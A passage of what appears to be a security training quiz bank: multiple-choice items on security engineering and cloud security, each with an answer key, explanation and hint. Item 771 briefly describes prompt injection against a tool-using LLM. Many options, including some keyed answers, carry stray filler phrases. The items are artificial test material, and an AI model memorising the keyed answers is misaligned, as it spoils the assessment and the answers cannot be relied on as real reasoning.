    options: ["Annual penetration testing only, carried out by an outside firm on a sample","Letting each team pick its own approach to authentication, and authorisation","A wiki page of recommendations","Central discovery, a gateway baseline and automated tests, in most cases"],
    correct: 3, why: "A wiki page is the runner-up since it is easy to publish, but it does not enforce anything; automation and a baseline do.",
    hint: "Baseline and tests."
  },
  {
    id: 745, rank: 3, role: "security-engineering", topic: "Legacy Containment", difficulty: "EXPERT",
    exhibit: "Segment OT-LEG\nHosts: 14 (Windows XP/7), no patches available\nCurrent rules: ANY -> OT-LEG allow; OT-LEG -> ANY allow\nRequired flows: HMI to PLC tcp/502, historian pull tcp/1433",
    q: "Plant controllers cannot be patched and must keep running. What compensating strategy is best?",
    options: ["Rely on staff to avoid risky websites","Isolate them behind a firewall with allow-listed flows and monitoring","Disable logging to save resources, until the next scheduled review takes place","Install antivirus on each and leave them on the flat network, where that is practical"],
    correct: 1, why: "Compensating controls around the system reduce exposure when patching is impossible.",
    hint: "Isolate and monitor."
  },
  {
    id: 746, rank: 3, role: "security-engineering", topic: "Email Security Architecture", difficulty: "EXPERT",
    q: "Which design best reduces phishing and impersonation at the organisation level?",
    options: ["Blocking all external email, and no phishing message can reach any user","User awareness training carried out once a year, with no technical controls added","Sender authentication, gateway filtering, link protection and easy reporting","Allowing all attachments through the gateway, and relying on user judgement"],
    correct: 2, why: "Layered technical controls with user reporting reduce successful attacks.",
    hint: "Layers and reporting."
  },
  {
    id: 747, rank: 3, role: "security-engineering", topic: "Endpoint Architecture", difficulty: "EXPERT",
    q: "Which endpoint architecture best supports rapid containment?",
    options: ["Manual checking of each device by the users when they suspect a problem","Local antivirus only, updated by the users when they remember to run the update","Agent telemetry with remote isolation and central policy","Weekly full scans scheduled for Sunday night on each of the laptops"],
    correct: 2, why: "Central visibility and response speed up containment.",
    hint: "Isolate remotely."
  },
  {
    id: 748, rank: 3, role: "security-engineering", topic: "DNS Architecture", difficulty: "EXPERT",
    q: "How can DNS architecture support security?",
    options: ["Disabling the DNS logs to save storage, and reduce the cost of the platform","Protective resolvers, query logging and restricted external resolvers","Using only IP addresses, and DNS is never needed by the applications","Allowing any host to use any resolver"],
    correct: 1, why: "DNS is a control point for blocking and detecting malicious domains.",
    hint: "Control DNS."
  },
  {
    id: 749, rank: 3, role: "security-engineering", topic: "Release Gating", difficulty: "EXPERT",
    q: "Which release gate design best balances speed and assurance?",
    options: ["Manual review of every single change by the security team before release","No gates at all, and every change reaches production at maximum speed","A single gate immediately before production that all of the changes must pass","Risk-based gates with automation and manual review for high risk"],
    correct: 3, why: "Automated and risk-based gates keep pace with delivery.",
    hint: "Risk-based."
  },
  {
    id: 750, rank: 3, role: "security-engineering", topic: "Observability and Security", difficulty: "EXPERT",
    q: "Why should security share telemetry infrastructure with engineering observability?",
    options: ["It removes the need for detection","It makes logs shorter","It avoids access control","Common pipelines reduce cost and provide richer context for detection"],
    correct: 3, why: "Shared data improves visibility and efficiency when access is controlled.",
    hint: "Shared pipelines."
  },
  {
    id: 751, rank: 3, role: "security-engineering", topic: "Secure Defaults in Libraries", difficulty: "EXPERT",
    q: "How should an internal crypto library be designed?",
    options: ["With every option available","With deprecated algorithms enabled","With safe defaults and no unsafe options exposed to developers","With no documentation"],
    correct: 2, why: "Hard-to-misuse APIs reduce cryptographic errors.",
    hint: "Hard to misuse."
  },
  {
    id: 752, rank: 3, role: "security-engineering", topic: "Resilient Authentication", difficulty: "EXPERT",
    q: "Which design keeps authentication available during a cloud region failure?",
    options: ["One region only","Disabling MFA","Manual recovery from a document","Multi-region deployment with tested failover and independent dependencies"],
    correct: 3, why: "Resilience needs redundancy and tested recovery.",
    hint: "Multi-region."
  },
  {
    id: 753, rank: 3, role: "security-engineering", topic: "Trust Between Environments", difficulty: "EXPERT",
    q: "How should production and development environments be related?",
    options: ["Separate accounts and credentials with no trust from development to production","Production access for all developers","One shared account for convenience","A shared admin role"],
    correct: 0, why: "Separation limits blast radius of development compromise.",
    hint: "Separate."
  },
  {
    id: 754, rank: 3, role: "security-engineering", topic: "Evidence of Control Operation", difficulty: "EXPERT",
    q: "Which architecture best provides continuous evidence for auditors?",
    options: ["Automated control checks that record results in a tamper-evident store","Annual screenshots","A verbal briefing","Email statements from owners"],
    correct: 0, why: "Machine-generated evidence is reliable and repeatable.",
    hint: "Automated evidence."
  },
  {
    id: 755, rank: 3, role: "security-engineering", topic: "Dependency on Open Source", difficulty: "EXPERT",
    q: "How should a company manage risk from critical open-source libraries?",
    options: ["Block all open source","Rely on luck","Ignore them as they are free","Maintain an inventory, monitor advisories and plan upgrades or replacements with owners, as a general rule"],
    correct: 3, why: "Visible ownership of dependencies enables timely action.",
    hint: "Inventory and owners."
  },
  {
    id: 756, rank: 3, role: "security-engineering", topic: "Mobile Device Architecture", difficulty: "EXPERT",
    q: "Which approach best protects company data on employee phones?",
    options: ["Managed apps with containerisation, device compliance checks and remote wipe of company data, as a general rule","Allow any device with no checks","Ban all mobile access","Store data on the phone's open storage"],
    correct: 0, why: "Controls should separate and protect company data on personal devices.",
    hint: "Separate and manage."
  },
  {
    id: 757, rank: 3, role: "security-engineering", topic: "Rate Limiting Architecture", difficulty: "EXPERT",
    q: "Where should coarse rate limiting for internet traffic normally be applied?",
    options: ["Only inside the database","At the edge, before traffic reaches the application, in most cases","Only on the developer laptop","Nowhere"],
    correct: 1, why: "Early filtering protects downstream systems.",
    hint: "At the edge."
  },
  {
    id: 758, rank: 3, role: "security-engineering", topic: "Security Review Capacity", difficulty: "EXPERT",
    q: "The security team cannot review every project. What is the best approach?",
    options: ["Skip reviews","Review everything slowly","Review only after launch","Triage by risk with self-service checklists and full review for high-risk work"],
    correct: 3, why: "Risk-based triage focuses scarce expertise.",
    hint: "Triage by risk."
  },
  {
    id: 759, rank: 3, role: "security-engineering", topic: "Architecture Review Finding", difficulty: "EXPERT",
    exhibit: "Internet -> WAF -> Web tier (DMZ)\nWeb tier -> App tier (private)\nApp tier -> Orders DB (private)\nWeb tier -> Reporting DB (private, direct)\nAdmin -> Jump host -> App tier",
    q: "An architecture review of this design finds a high-risk weakness. Which is it?",
    options: ["Logs flow to a central collector","The API tier sits behind a gateway","The reporting database is reachable from the internet-facing tier","The admin network has its own jump host"],
    correct: 2, why: "Placing the database where public-facing components can reach it removes a layer of protection.",
    hint: "Check the arrows."
  },
  {
    id: 760, rank: 3, role: "security-engineering", topic: "Certificate Revocation Design", difficulty: "EXPERT",
    q: "Clients keep trusting a leaked certificate for days. Which improvement shortens that window?",
    options: ["Short-lived certificates with automated renewal and revocation checks","Make the certificate validity much longer","Remove revocation checks to speed up connections, in the first instance","Share the private key with the vendor for backup, until the next scheduled review takes place"],
    correct: 0, why: "Short lifetimes and working revocation limit how long a stolen certificate is useful.",
    hint: "Shrink the window."
  },
  {
    id: 761, rank: 4, role: "security-engineering", topic: "TLS 0-RTT Replay", difficulty: "EXPERT",
    q: "A payments API enables TLS 1.3 0-RTT early data for speed. What is the BEST design response?",
    options: ["Rely on the client to avoid sending the same request twice, in most cases","Allow early data only for idempotent requests and enforce replay protection on the server","Allow early data for all requests as TLS protects the connection, and revisit the decision after the next release","Disable TLS 1.3 entirely, and return to TLS 1.2, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Allowing everything is the runner-up since TLS encrypts the data, but early data can be replayed, so only safe operations should use it.",
    hint: "Replay is the risk."
  },
  {
    id: 762, rank: 4, role: "security-engineering", topic: "Workload Attestation", difficulty: "EXPERT",
    q: "Which design best proves to a secrets service that a workload is the genuine one it claims to be?",
    options: ["A shared token written into the deployment file that every replica reads","The host name of the workload, which is set when the instance is created","The IP address of the workload, which the network team keeps in an inventory, in most cases","Platform attestation of workload identity against signed measurements, as a general rule"],
    correct: 3, why: "Attestation ties identity to verifiable runtime properties rather than to guessable attributes.",
    hint: "Attest, do not assert."
  },
  {
    id: 763, rank: 4, role: "security-engineering", topic: "Reproducible Builds", difficulty: "EXPERT",
    q: "What assurance do reproducible builds provide?",
    options: ["Dependencies are never needed as every library is compiled into the binary","Independent parties can rebuild the same bytes and spot tampering","Builds always run faster as the compiler cache is shared between all of the teams","The source code is hidden from the customers who receive the compiled product"],
    correct: 1, why: "Matching outputs from independent builds expose compromised build systems.",
    hint: "Same bytes."
  },
  {
    id: 764, rank: 4, role: "security-engineering", topic: "Key Ceremony Design", difficulty: "EXPERT",
    q: "Which design best protects the root key of a signing authority?",
    options: ["HSM generation with split knowledge, dual control and a witnessed log, as a general rule","One engineer holding the whole key for convenience while the team is small","Generation on an admin laptop with a copy kept in cloud storage for recovery, in most cases","An emailed backup of the key sent to the team mailing list for safekeeping, as a general rule"],
    correct: 0, why: "Dual control and split knowledge prevent one person from misusing or losing the root.",
    hint: "Dual control."
  },
  {
    id: 765, rank: 4, role: "security-engineering", topic: "Post-Quantum Migration", difficulty: "EXPERT",
    q: "What is the BEST first step for an organisation planning to move to post-quantum cryptography?",
    options: ["Wait until quantum computers are working, and then begin to plan a migration","Move all data to removable media, and keep it in a locked safe","Inventory where cryptography is used and rank data by secrecy lifetime","Double all key sizes"],
    correct: 2, why: "Doubling key sizes is the runner-up since it is quick, but it does not address the algorithms that quantum computers break; an inventory shows what to migrate first.",
    hint: "Know what you have."
  },
  {
    id: 766, rank: 4, role: "security-engineering", topic: "Spectre-Class Mitigation", difficulty: "EXPERT",
    q: "Which approach best addresses speculative-execution side channels for sensitive workloads in a shared cloud?",
    options: ["Isolate sensitive workloads on dedicated hosts and apply mitigations","Ignore the issue as the attacks are theoretical, and need very precise timing","Lengthen the passwords of every user who has access to the shared cloud hosts","Disable all logging on the shared hosts, and attackers cannot read the events"],
    correct: 0, why: "Isolation and mitigations reduce cross-tenant leakage risk.",
    hint: "Isolate sensitive work."
  },
  {
    id: 767, rank: 4, role: "security-engineering", topic: "Transparency Logs", difficulty: "EXPERT",
    q: "How do certificate transparency logs help defenders?",
    options: ["They encrypt the certificates that the authority issues to the customers who ask","They speed up the handshake between the browser, and the server on each visit","They store the private keys for the certificates, and they can be recovered","They publicly record issued certificates so mis-issuance is seen"],
    correct: 3, why: "Monitoring logs reveals unexpected certificates for your domains.",
    hint: "Public record."
  },
  {
    id: 768, rank: 4, role: "security-engineering", topic: "Memory Tagging", difficulty: "EXPERT",
    q: "What does hardware memory tagging mainly help detect?",
    options: ["Network congestion on the links between the data centres during peak hours, in most cases","Weak passwords chosen by the users of the application during their registration","Use-after-free, and out-of-bounds memory errors, until the next scheduled review takes place","Phishing emails that reach the mailboxes of staff in the finance department, as soon as practical"],
    correct: 2, why: "Tags catch mismatched pointer and memory access patterns at runtime.",
    hint: "Memory errors."
  },
  {
    id: 769, rank: 4, role: "security-engineering", topic: "Seccomp Profile", difficulty: "EXPERT",
    exhibit: "{\"defaultAction\":\"SCMP_ACT_ERRNO\",\"syscalls\":[{\"names\":[\"read\",\"write\",\"exit\",\"futex\"],\"action\":\"SCMP_ACT_ALLOW\"}]}",
    q: "What does a seccomp profile do for a containerised service?",
    options: ["Restricts the system calls the process may make","Controls the colour of the terminal output that the process writes to the console","Encrypts all of the network traffic that the process sends to the internet","Limits the amount of disk space that the process may use for temporary files"],
    correct: 0, why: "Fewer permitted system calls reduce kernel attack surface.",
    hint: "Limit syscalls."
  },
  {
    id: 770, rank: 4, role: "security-engineering", topic: "Secure Boot Chain", difficulty: "EXPERT",
    q: "Which feature helps ensure only trusted firmware and boot components start on a server?",
    options: ["A new keyboard that is locked in a cabinet next to the server in the rack","A bigger system disk that has enough room for the operating system updates","Measured, and verified boot anchored in a hardware root of trust, as a general rule","A long BIOS password that the administrators write down in the server room log, in most cases"],
    correct: 2, why: "Each stage is verified or measured so tampering is detected.",
    hint: "Chain of trust."
  },
  {
    id: 771, rank: 4, role: "security-engineering", topic: "Prompt Injection Architecture", difficulty: "EXPERT",
    q: "An LLM assistant reads untrusted web pages and can call internal tools. What is the BEST architecture?",
    options: ["Remove all of the logging, and attackers cannot see how the model responds","Tell the model in the prompt to ignore malicious instructions","Give the model full access to all of the tools, and it can work better","Treat model output as untrusted and gate sensitive tool actions"],
    correct: 3, why: "A prompt warning is the runner-up since it is easy, but injected text can override it; enforcement must be outside the model.",
    hint: "Enforce outside the model."
  },
  {
    id: 772, rank: 4, role: "security-engineering", topic: "Agent Tool Sandbox", difficulty: "EXPERT",
    q: "An AI agent executes code from untrusted sources. Which control is most important?",
    options: ["An isolated sandbox with no secrets, restricted network and resource limits","Allowing unrestricted internet access, and review the outcome at the next monthly meeting","Running it on the developer laptop, and review the outcome at the next monthly meeting","Giving it the production credentials"],
    correct: 0, why: "Sandboxing limits what a manipulated agent can reach.",
    hint: "Isolate execution."
  },
  {
    id: 773, rank: 4, role: "security-engineering", topic: "Model Supply Chain", difficulty: "EXPERT",
    q: "Which practice best reduces risk from downloaded machine learning models?",
    options: ["Disable the hash checks as they slow down the loading of large models","Use trusted sources, verify signatures and avoid unsafe formats, until the next scheduled review takes place","Run models directly from any website that offers the weights without any checks, until the next scheduled review takes place","Share the models between teams by email attachments, and nobody downloads twice"],
    correct: 1, why: "Models can contain executable payloads, so provenance and safe formats matter.",
    hint: "Verify and use safe formats."
  },
  {
    id: 774, rank: 4, role: "security-engineering", topic: "Vector Store Authorisation", difficulty: "EXPERT",
    q: "A retrieval system indexes documents from many departments. What design prevents users seeing content they should not?",
    options: ["Enforce source permissions at retrieval with per-user filtering, and review the outcome at the next monthly meeting","Index everything, and trust the model not to reveal documents that users may not read","Let every user query every index and rely on the audit trail to find misuse, until the next scheduled review takes place","Remove the permissions at ingestion, and all documents are treated the same"],
    correct: 0, why: "Access control must be applied before content reaches the model.",
    hint: "Permissions at retrieval."
  },
  {
    id: 775, rank: 4, role: "security-engineering", topic: "Forward-Secure Logging", difficulty: "EXPERT",
    q: "What property does forward-secure logging provide?",
    options: ["Logs need no storage as they are streamed to analysts, and then discarded","Past entries cannot be silently altered after a later compromise","Logs are shorter as older records are summarised at the end of each day","Logs are public, and anyone can verify that the company has recorded events"],
    correct: 1, why: "Evolving keys prevent forging earlier records.",
    hint: "Past entries protected."
  },
  {
    id: 776, rank: 4, role: "security-engineering", topic: "SLSA Levels", difficulty: "EXPERT",
    q: "What does a higher SLSA build level generally add?",
    options: ["Stronger guarantees about source, build integrity and provenance, as a general rule","Faster compilation as higher levels allow more parallel build machines to be used, as a general rule","Smaller binaries as the build removes all of the unused debugging symbols","More dependencies in the product as the framework asks for extra libraries, in most cases"],
    correct: 0, why: "Higher levels require hardened, auditable builds.",
    hint: "Provenance."
  },
  {
    id: 777, rank: 4, role: "security-engineering", topic: "DPoP Tokens", difficulty: "EXPERT",
    exhibit: "Authorization: DPoP eyJhbGciOiJSUzI1NiJ9...\nDPoP: eyJ0eXAiOiJkcG9wK2p3dCIsImFsZyI6IkVTMjU2Ii...",
    q: "What problem does sender-constrained token binding such as DPoP address?",
    options: ["Stolen access tokens replayed by another party","Weak passwords chosen by users who register for the first time on the website","Slow logins caused by the identity provider having to check many password rules","Email spoofing against the domain of the company by attackers outside the network"],
    correct: 0, why: "The token is bound to a key held by the client.",
    hint: "Bind the token."
  },
  {
    id: 778, rank: 4, role: "security-engineering", topic: "Offline Key Ceremony", difficulty: "EXPERT",
    q: "Why is a root key generated in a formal key ceremony?",
    options: ["It removes the need for any backups of the key","Witnessed steps prove the key was created safely","It makes every signature shorter than before in practice","It avoids audits"],
    correct: 1, why: "A witnessed, documented ceremony gives assurance that the key was never exposed.",
    hint: "Witnessed and scripted."
  },
  {
    id: 779, rank: 4, role: "security-engineering", topic: "BMC Firmware Risk", difficulty: "EXPERT",
    q: "Why are server baseboard management controllers an important security concern?",
    options: ["They store the backups of the operating system for the server that hosts them","They give powerful out-of-band control and run their own firmware","They have no network access, and can only be reached by a person at the server","They only control the fans, and the temperature sensors inside the server chassis"],
    correct: 1, why: "Compromised BMCs persist below the operating system.",
    hint: "Out-of-band control."
  },
  {
    id: 780, rank: 4, role: "security-engineering", topic: "Compiler Hardening", difficulty: "EXPERT",
    q: "Which build option best mitigates control-flow hijacking in native code?",
    options: ["Removing the comments from the source code before the compiler is started","Using longer variable names, and the code is easier to read in reviews","Control-flow integrity with stack protections and ASLR, as a general rule","Disabling optimisation, and the compiler produces the same output each time"],
    correct: 2, why: "Layered exploit mitigations raise the cost of memory corruption attacks.",
    hint: "Mitigate hijacking."
  },
  {
    id: 781, rank: 4, role: "security-engineering", topic: "Formal Verification Scope", difficulty: "EXPERT",
    q: "What is a sensible use of formal verification in security engineering?",
    options: ["Verifying every line of code in a large application with many developers","Proving properties of small critical parts such as protocol cores","Proving that the business is secure to the satisfaction of the regulators","Replacing all of the testing that would otherwise be done before a release"],
    correct: 1, why: "It is costly, so it is used where the highest assurance matters.",
    hint: "Small and critical."
  },
  {
    id: 782, rank: 4, role: "security-engineering", topic: "Defensive Fuzzing", difficulty: "EXPERT",
    q: "A library parses untrusted files. What is the BEST way to improve assurance over time?",
    options: ["Continuous coverage-guided fuzzing with sanitisers and a corpus","Disabling verbose errors, and crashes are never shown to the callers","One manual test per year","A code comment saying input is validated"],
    correct: 0, why: "A yearly manual test is the runner-up as it adds human insight, but parsers change with each commit and need repeatable coverage.",
    hint: "Continuous fuzzing."
  },
  {
    id: 783, rank: 4, role: "security-engineering", topic: "Cloud Hypervisor Risk", difficulty: "EXPERT",
    q: "Which architecture best limits the impact of a rare hypervisor escape?",
    options: ["Disable monitoring, and revisit the decision after the next release","Run all workloads together","Use one account","Separate sensitive workloads by account, host pool and key domain"],
    correct: 3, why: "Blast radius reduction assumes isolation can fail.",
    hint: "Assume breach."
  },
  {
    id: 784, rank: 4, role: "security-engineering", topic: "Incident-Driven Redesign", difficulty: "EXPERT",
    q: "After a breach, which engineering response is most valuable?",
    options: ["Rename the system, and the attackers cannot recognise it the next time","Patch the single bug that was used in the attack, and consider the matter closed","Blame the developer who wrote the code, and arrange extra training for them","Fix the class of weakness through a design change"],
    correct: 3, why: "Eliminating the underlying class reduces repeat incidents.",
    hint: "Fix the class."
  },
  {
    id: 785, rank: 4, role: "security-engineering", topic: "Zero Trust for Workloads", difficulty: "EXPERT",
    q: "What does zero trust for workloads mean in practice?",
    options: ["Every call is authenticated using workload identity, wherever it comes from","Using one large firewall around the data centre to separate the inside, and outside","Trusting calls that originate from inside the network as they passed the firewall","Disabling identity checks between services to avoid delays in the request path, until the next scheduled review takes place"],
    correct: 0, why: "Network position is not enough to trust a request.",
    hint: "Authenticate every call."
  },
  {
    id: 786, rank: 4, role: "security-engineering", topic: "mTLS Rotation Failure", difficulty: "EXPERT",
    q: "Certificates for service-to-service mTLS expire silently and cause outages. What is the BEST engineering fix?",
    options: ["Rotate the certificates by hand every quarter using a checklist kept in the wiki","Extend lifetimes to ten years","Disable mTLS for the services that failed, and they can talk again at once","Automate issuance and rotation, with short lifetimes and expiry alerts"],
    correct: 3, why: "Long lifetimes are the runner-up since they avoid expiry, but they increase exposure; automation solves both.",
    hint: "Automate rotation."
  },
  {
    id: 787, rank: 4, role: "security-engineering", topic: "OSS Maintainer Takeover", difficulty: "EXPERT",
    q: "Which control best reduces risk if an open-source maintainer account is hijacked?",
    options: ["Always take the latest version automatically, and fixes arrive without delay","Pin versions and hashes, review updates and delay critical packages, in most cases","Disable the dependency scanning as it generates too many warnings for teams, as soon as practical","Trust the registry as it checks the identity of every maintainer for us, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Controlled updating limits exposure to malicious releases.",
    hint: "Pin and review."
  },
  {
    id: 788, rank: 4, role: "security-engineering", topic: "Library Hijacking Mitigation", difficulty: "EXPERT",
    q: "Which practice best prevents loading a malicious library from an unexpected path?",
    options: ["Allow writable library directories, and the users can install their own tools","Use relative paths","Absolute trusted paths, signed binaries and restricted search paths","Add more libraries to the search path, and the program can always find them"],
    correct: 2, why: "Controlled loading removes hijack opportunities.",
    hint: "Control the path."
  },
  {
    id: 789, rank: 4, role: "security-engineering", topic: "Differential Privacy", difficulty: "EXPERT",
    q: "What does differential privacy aim to protect?",
    options: ["Software licences","Individuals' data by adding calibrated noise to published statistics","Passwords","Network traffic, in most cases"],
    correct: 1, why: "It limits what can be inferred about any one person.",
    hint: "Noise for privacy."
  },
  {
    id: 790, rank: 4, role: "security-engineering", topic: "Homomorphic Encryption Trade-off", difficulty: "EXPERT",
    q: "What is the main practical limitation of fully homomorphic encryption today?",
    options: ["It is illegal","It cannot encrypt","High computational cost and latency","It has no keys"],
    correct: 2, why: "Computation on encrypted data is currently expensive for many workloads.",
    hint: "Performance cost."
  },
  {
    id: 791, rank: 4, role: "security-engineering", topic: "Chaos for Security", difficulty: "EXPERT",
    q: "What is the aim of security chaos engineering?",
    options: ["Causing outages for fun","Removing monitoring","Testing that controls and responses work when components fail or are attacked","Avoiding change"],
    correct: 2, why: "Controlled experiments reveal hidden assumptions.",
    hint: "Experiment safely."
  },
  {
    id: 792, rank: 4, role: "security-engineering", topic: "Detection From Engineering", difficulty: "EXPERT",
    q: "How should engineers contribute to detection of attacks on their own services?",
    options: ["Hide logs","Delay the alerts until the end of the sprint, and the team is not interrupted","Disable authentication events as they produce a large volume of log lines","Emit security events and document abuse cases for detection teams"],
    correct: 3, why: "Application-level signals enable high-fidelity detection.",
    hint: "Emit signals."
  },
  {
    id: 793, rank: 4, role: "security-engineering", topic: "Secret Leak Response Automation", difficulty: "EXPERT",
    q: "A secret is detected in a public repository. Which automated response is best?",
    options: ["Delete the commit only","Wait a week","Email the team","Revoke and rotate the credential automatically and open a ticket with the owner"],
    correct: 3, why: "Fast revocation limits misuse.",
    hint: "Revoke fast."
  },
  {
    id: 794, rank: 4, role: "security-engineering", topic: "Hardware Token Lifecycle", difficulty: "EXPERT",
    q: "What should a FIDO2 deployment plan for beyond issuing keys?",
    options: ["Nothing","Recovery by email only","Enrolment, loss and recovery, and revocation processes as strong as the keys themselves","Shared tokens"],
    correct: 2, why: "Weak recovery undermines strong authentication.",
    hint: "Strong recovery."
  },
  {
    id: 795, rank: 4, role: "security-engineering", topic: "Edge Compute Security", difficulty: "EXPERT",
    q: "A company runs code on third-party edge nodes. Which assumption should the design make?",
    options: ["Nodes never fail, as a general rule","Nodes are always private","Nodes are fully trusted","Nodes can be physically accessed or tampered with, so minimise secrets and verify integrity"],
    correct: 3, why: "Untrusted locations need protective design.",
    hint: "Minimise secrets."
  },
  {
    id: 796, rank: 4, role: "security-engineering", topic: "Secure Multiparty Computation", difficulty: "EXPERT",
    q: "When might secure multiparty computation be appropriate?",
    options: ["When storing backups","When printing, as a general rule","When parties must compute a joint result without revealing their inputs to each other","When sending email"],
    correct: 2, why: "It enables collaboration without data sharing.",
    hint: "Joint compute."
  },
  {
    id: 797, rank: 4, role: "security-engineering", topic: "Software Update Trust", difficulty: "EXPERT",
    q: "Which design best protects a software update channel against compromise of the update server?",
    options: ["Offline signing keys, threshold trust and client-side verification with rollback protection","One online signing key","Unsigned updates over HTTPS, as a general rule","Updates by email"],
    correct: 0, why: "Separating signing from distribution limits the effect of server compromise.",
    hint: "Sign offline."
  },
  {
    id: 798, rank: 4, role: "security-engineering", topic: "Security Debt Management", difficulty: "EXPERT",
    q: "How should long-lived security design debt be handled?",
    options: ["Wait for an audit","Hide it, then record the result in the ticket","Record it with owners, risk and a funded remediation plan visible to leadership","Ignore it"],
    correct: 2, why: "Visible decisions prevent silent accumulation.",
    hint: "Make it visible."
  },
  {
    id: 799, rank: 4, role: "security-engineering", topic: "Signing Pipeline Compromise", difficulty: "EXPERT",
    q: "Developers can sign releases from their own laptops using a copied key. What is the best control?",
    options: ["Back it up to a shared mailbox","Centralise signing in a service that logs and approves each request","Encrypt it with a shared password that the team knows, and revisit the decision after the next release","Move it to a different folder on each of the laptops, then record the result in the ticket"],
    correct: 1, why: "A stolen signing key lets attackers distribute trusted malware, so key use must be controlled and audited.",
    hint: "Control signing requests."
  },
  {
    id: 800, rank: 4, role: "security-engineering", topic: "Metrics for Engineering Security", difficulty: "EXPERT",
    exhibit: "Service baseline compliance\nTeam A 92%  | median critical fix 4 days\nTeam B 61%  | median critical fix 29 days\nTeam C 78%  | median critical fix 11 days",
    q: "Which measure best shows that engineering teams are building security in?",
    options: ["The number of security slides presented","The number of scans run","The number of meetings held","The share of services meeting a secure baseline and the time to fix critical findings"],
    correct: 3, why: "Outcome measures show the real state of the estate.",
    hint: "Baseline and fix time."
  },
  {
    id: 801, rank: 0, role: "cloud-security", topic: "Shared Responsibility Model", difficulty: "BEGINNER",
    q: "In the cloud shared responsibility model, who is responsible for the security of customer data stored in a service?",
    options: ["The internet service provider, as it carries the data","The customer","The cloud provider alone, as it owns the hardware","Nobody, as the data is stored in a shared service"],
    correct: 1, why: "Providers secure the infrastructure, but customers remain responsible for their data, access and configuration.",
    hint: "Your data, your duty."
  },
  {
    id: 802, rank: 0, role: "cloud-security", topic: "IaaS Patching Duty", difficulty: "BEGINNER",
    q: "For a virtual machine in an infrastructure-as-a-service model, who normally patches the guest operating system?",
    options: ["The internet service provider that supplies the connection","The cloud provider's data centre staff on a monthly schedule","The hardware manufacturer through firmware updates","The customer who runs the machine, as a general rule"],
    correct: 3, why: "In IaaS the customer manages the operating system and everything above it.",
    hint: "Customer owns the OS."
  },
  {
    id: 803, rank: 0, role: "cloud-security", topic: "Root Account Protection", difficulty: "BEGINNER",
    q: "What is the best way to protect a cloud account's root user?",
    options: ["Enable MFA, avoid daily use and keep the credentials secured","Write the password in the team chat and it is not lost","Share the password with all of the administrators in the team","Use the root account for everyday tasks to save time"],
    correct: 0, why: "The root user has unrestricted power, so it needs strong protection and limited use.",
    hint: "Lock it away."
  },
  {
    id: 804, rank: 0, role: "cloud-security", topic: "Public Storage Finding", difficulty: "BEGINNER",
    exhibit: "Bucket: customer-invoices-2025\nPublic access block: OFF\nACL: AllUsers READ\nVersioning: Enabled\nEncryption: SSE-S3",
    q: "Which finding in this storage bucket configuration is the most serious?",
    options: ["Server-side encryption is enabled with a key that the provider manages","Versioning is enabled for the bucket, and older copies of files are kept","The bucket has a descriptive name that shows the year of the invoices","Public read access for everyone"],
    correct: 3, why: "Public read access can expose all stored objects to anyone.",
    hint: "Check the access line."
  },
  {
    id: 805, rank: 0, role: "cloud-security", topic: "Security Group Rule", difficulty: "BEGINNER",
    exhibit: "Inbound rule\nProtocol: TCP\nPort: 22\nSource: 0.0.0.0/0\nDescription: admin access",
    q: "What does this security group rule allow?",
    options: ["Anyone on the internet to connect to SSH on the server","Outbound traffic to the database only, as a general rule","Nothing, as the rule is disabled","Only the company office to reach the web port"],
    correct: 0, why: "Source 0.0.0.0/0 on port 22 exposes SSH to the whole internet.",
    hint: "Read the source and port."
  },
  {
    id: 806, rank: 0, role: "cloud-security", topic: "Least Privilege in IAM", difficulty: "BEGINNER",
    q: "A developer only needs to read objects from one storage bucket. Which permission is best?",
    options: ["Administrator access to the whole account","Full access to all storage in the account","Permission to delete any resource in the account","Read-only access to that bucket"],
    correct: 3, why: "Granting only what is needed limits damage from mistakes and stolen credentials.",
    hint: "Smallest permission."
  },
  {
    id: 807, rank: 0, role: "cloud-security", topic: "Access Key Exposure", difficulty: "BEGINNER",
    q: "A developer posts a cloud access key in a public code repository. What is the BEST first action?",
    options: ["Ask the developer to be more careful in future","Disable and rotate the key and review its recent activity","Change the name of the repository","Delete the post and keep using the same key, and revisit the decision after the next release"],
    correct: 1, why: "Deleting the post is the runner-up since it stops further exposure, but the key may already be copied, so revoke it first.",
    hint: "Revoke the key."
  },
  {
    id: 808, rank: 0, role: "cloud-security", topic: "Encryption in the Cloud", difficulty: "BEGINNER",
    q: "What does encrypting a cloud storage volume protect against?",
    options: ["Reading the data if the underlying storage is accessed without the key","All phishing emails sent to the users of the system","Slow network speed between the regions of the provider, as a general rule","Weak passwords chosen by the administrators of the account"],
    correct: 0, why: "Encryption at rest makes stored data unreadable without the key.",
    hint: "Data at rest."
  },
  {
    id: 809, rank: 0, role: "cloud-security", topic: "Audit Logging", difficulty: "BEGINNER",
    q: "Why should audit logging of cloud account activity be enabled?",
    options: ["To make the cloud services run faster for the users","To remove the need for any permissions in the account","To record who did what so that misuse can be investigated","To reduce the monthly bill that is paid to the cloud provider"],
    correct: 2, why: "Management-plane logs show changes and access, which is essential for detection and forensics.",
    hint: "Who did what."
  },
  {
    id: 810, rank: 0, role: "cloud-security", topic: "Unexpected Cloud Bill", difficulty: "BEGINNER",
    q: "A cloud bill suddenly rises and many large compute instances appear in an unused region. What is the most likely cause?",
    options: ["A new employee reading a help document in the console on the first day","A change to the logo, and the colour theme of the management console","Stolen credentials used to mine cryptocurrency","A scheduled backup that has been delayed, and now runs for much longer"],
    correct: 2, why: "Attackers often launch compute in unused regions to mine cryptocurrency at the victim's cost.",
    hint: "Unused region, big bill."
  },
  {
    id: 811, rank: 0, role: "cloud-security", topic: "Multi-Factor for Console", difficulty: "BEGINNER",
    q: "Which action best reduces the risk of cloud console account takeover?",
    options: ["Requiring MFA for all users, in most cases","Disabling the audit logs for administrators","Requiring longer usernames for the users of the account","Hiding the console address from the staff"],
    correct: 0, why: "MFA protects accounts even when passwords are stolen.",
    hint: "Second factor."
  },
  {
    id: 812, rank: 0, role: "cloud-security", topic: "Region Choice and Privacy", difficulty: "BEGINNER",
    q: "Why might a company choose to keep customer data in a specific region?",
    options: ["To avoid having to use any encryption","To meet data residency and privacy requirements","To make the data harder for the customer to read","To increase the cost of the service on purpose"],
    correct: 1, why: "Laws and contracts may require data to stay in certain countries.",
    hint: "Residency rules."
  },
  {
    id: 813, rank: 0, role: "cloud-security", topic: "Snapshot Sharing", difficulty: "BEGINNER",
    q: "A team shares a disk snapshot with another account for testing. What is the BEST way to do it?",
